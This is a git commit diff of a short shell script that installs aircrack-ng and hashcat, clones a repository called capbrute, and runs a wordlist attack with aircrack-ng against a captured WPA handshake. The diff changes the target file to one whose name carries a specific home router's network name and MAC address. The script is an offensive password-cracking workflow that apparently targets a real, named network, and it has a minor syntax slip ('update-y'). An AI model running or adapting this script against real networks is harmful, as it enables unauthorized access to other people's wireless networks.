0b90b33ef74c80ae2bc224af0445d0a0dd22cacf
JamalNiga <141185853+JamalNiga@users.noreply.github.com>
2023-10-12 22:47:54 +0100

    Update b.sh

--- b.sh
+++ b.sh
@@ -1,7 +1,6 @@
 sudo apt-get update-y
 sudo apt install aircrack-ng python3 hashcat -y
 git clone https://github.com/JamalNiga/capbrute.git cap
-cd cap
-ls
+cd cap && ls -al
 python3 hy.py
-aircrack-ng -w *txt 9861.cap
+aircrack-ng -w *txt handshake_inwiHome4GA0F511_E2-9F-2E-11-F5-A2_2023-10-12T17-30-35.cap
